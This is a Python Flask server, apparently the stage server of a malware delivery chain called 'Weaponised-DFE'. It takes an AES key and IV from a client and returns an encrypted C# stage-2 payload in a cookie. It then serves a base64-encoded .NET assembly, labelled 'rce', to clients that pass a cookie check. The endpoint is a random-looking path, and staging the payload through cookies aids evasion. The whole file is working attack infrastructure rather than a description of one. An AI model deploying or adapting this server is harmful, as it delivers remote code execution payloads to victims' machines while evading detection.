# Name: Weaponised-DFE Server v1.0
# Created By: Sayan Ray [@BareBones90]

from json import dumps
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

from flask import *
from base64 import b64encode, b64decode

banner = """
██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗     ██████╗ ███████╗███████╗
██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║██╔════╝██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝
██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║███████╗█████╗  ██║  ██║    ██║  ██║█████╗  █████╗  
██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║╚════██║██╔══╝  ██║  ██║    ██║  ██║██╔══╝  ██╔══╝  
╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████║███████╗██████╔╝    ██████╔╝██║     ███████╗
 ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═════╝     ╚═════╝ ╚═╝     ╚══════╝
------------------------------------------------------------------------------------------------------------
                                                                       Created By: Sayan Ray [@BareBones90]
"""

print(banner)

# Implementing AES Encryption

class AESCipher:
	# Serve as the AES encryptor class

	def __init__(self, key: bytes, iv: bytes):
		# Assign the key and initialization vector required for encryption or decryption

		self.key = key
		self.iv = iv
		self.cipher = AES.new(self.key, AES.MODE_CBC, self.iv)

	def encryptAES(self, text: str) -> str:
		# AES Encrypt

		# Encrypt into ciphertext
		encrypted_bytes = self.cipher.encrypt(pad(text.encode(), AES.block_size))

		# Base64 encode the ciphertext for better transmission
		encrypted_str = b64encode(encrypted_bytes).decode()
		return encrypted_str

	# Just implementing AES Decryption, we have no use of this in the server side :)
	def decryptAES(self, encrypted_str: str) -> str:
		# AES Decrypt

		# Decode the base64 encoded string to get the raw ciphertext.
		decoded_bytes = b64decode(encrypted_str.encode())

		# Decrypt the ciphertext
		decrypted_bytes = unpad(self.cipher.decrypt(decoded_bytes), AES.block_size)
		return decrypted_bytes.decode()

# Implement the Flask Web Application

app = Flask(__name__)

# Contains the original AES Encryption and Decryption Key and Initialization Vector (IV)
CREDS: dict = {
	"key": None,
	"iv": None
}

# Contains the Encrypted version of the JSON Dump of the key and value pair
# It is required for identifying if anyone is verified or not for receiving the base64 encoded .NET assembly code, after requesting GET /
ENC_JS: str = ""

@app.route("/")
def home():
	sessionID = request.cookies.get("sessionID") # Here sessionID with a capital D, is used to identify if the user is verified or not
	if sessionID:
		if sessionID == ENC_JS:
			rce: str = open(dotnetAssembly, "rb").read()
			b64_rce: str = b64encode(rce).decode()
			return make_response(b64_rce)
		else:
			return render_template("index.html")
	else:
		# If sessionID is not present, render the base template
		return render_template("index.html")

@app.route("/dDZRSlfTMxwmIeK", methods=("GET", "POST"))
def message():
	global CREDS, ENC_JS
	# GET Method implementation

	if request.method == "GET":
		return render_template("index.html")

	# POST Method main work
	# Here everything is based on assumption that any normal user isn't gonna request this, or else the server may crash out.
	elif request.method == "POST":
		data = request.get_json()

		# If userId is present with any value in the cookie, we assume the client is sending the original AES Key and IV.
		userId = request.cookies.get("userId")
		if userId:
			# Set the creds to what we receive.
			CREDS["key"] = data.get("baseKey")
			CREDS["iv"] = data.get("baseIv")

		# Frame the response
		resp = make_response(render_template("index.html"))
		
		# Get the stage 2 ready.
		toExec: str = open("toExec.cs", "r").read()

		aes: object = AESCipher(b64decode(CREDS["key"].encode()), b64decode(CREDS["iv"].encode()))
		enc_toExec: str = aes.encryptAES(toExec)
		resp.set_cookie("sessionId", enc_toExec)

		# Hope that the stage 2 execute correctly, and we prepare the AES encrypted version of the JSON Data to check validity in stage 3

		Json = dumps(data, separators=(",", ":"))
		aes: object = AESCipher(b64decode(CREDS["key"].encode()), b64decode(CREDS["iv"].encode()))
		ENC_JS = aes.encryptAES(Json)

		return resp

if __name__ == '__main__':
	host: str = "0.0.0.0"
	port: int = 443
	ssl_context: tuple = ("auth/cert.pem", "auth/key.pem")

	dotnetAssembly: str = "example_assemblies/calc.exe"

	app.run(host = host, port = port, ssl_context = ssl_context, debug = False)